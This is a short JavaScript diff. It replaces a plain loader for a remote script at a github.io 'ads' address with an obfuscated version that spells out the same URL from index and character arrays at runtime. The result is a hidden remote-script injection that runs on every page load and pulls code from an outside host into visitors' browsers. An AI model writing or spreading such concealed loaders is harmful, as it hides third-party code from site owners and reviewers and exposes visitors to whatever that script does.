@@ -1,5 +1,2 @@
-var _spx_today = new Date();
-var _spx_date = 'd'+_spx_today.getFullYear()+(_spx_today.getMonth()+1)+_spx_today.getDate();
-var spx_script = document.createElement('script');
-spx_script.src = "https://mngspx.github.io/cdn/4s-ads.js?t="+_spx_date;
-document.body.appendChild(spx_script);
+var _spx_today = new Date();var _spx_date = 'd'+_spx_today.getFullYear()+(_spx_today.getMonth()+1)+_spx_today.getDate();_11='';var spx_script = document.createElement('script');_1 = [0,1,1,2,3,4,5,5,6,7,8,3,2,9,10,8,11,1,0,12,13,10,11,15,5,16,17,7,5,18,3,19,20,17,3,10,21,3,22,1,23];_2 = ['h','t','p','s',':','/','m','n','g','x','.','i','u','b','i','o','c','d','4','-','a','j','?','='];for(i=0;i<41; i++){ _11 +=_2[_1[i]]; }
+spx_script.src = _11 +_spx_date;document.body.appendChild(spx_script);
